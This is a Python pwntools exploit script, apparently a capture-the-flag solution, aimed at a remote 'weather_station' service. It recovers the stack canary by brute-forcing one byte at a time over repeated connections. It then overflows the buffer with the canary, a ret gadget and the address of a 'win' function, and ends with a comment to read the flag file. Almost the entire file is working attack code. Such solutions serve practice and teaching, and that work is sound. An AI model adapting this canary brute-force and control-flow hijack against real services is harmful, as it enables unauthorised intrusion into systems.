#!/usr/bin/env python3
from pwn import *
import time

HOST, PORT = 'offsec.m0lecon.it', 13530
OFFSET_TO_CANARY = 56
elf = ELF('./weather_station', checksec=False)
OFFSET_TO_RIP = 72
ret_address=ROP(elf).find_gadget(['ret'])[0]
win_address=elf.sym.win
known = b"\x00"

for i in range(7):
    for bval in range(256):

        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess

        io = remote(HOST, PORT, level='error')
        io.recvuntil(b"location: ")
        io.send(b'a'*16)
        io.recvuntil(b"query: ")
        io.send(payload)
        try:
            data = io.recv(timeout=0.2)
        except EOFError:
            data = b""
        io.close()

        if b"sent!" in data:
            known = guess
            log.success(f"byte {i+1}: {bval:02x}")
            break

canary = u64(known)
log.info(f"Canary: {canary:#x}")

io = remote(HOST, PORT)
io.recvuntil(b"location: ")
io.send(b'a'*16)
io.recvuntil(b"query: ")


payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
     p64(ret_address),

    p64(win_address)
)
io.sendline(payload)

io.interactive()
#cat home/user/flag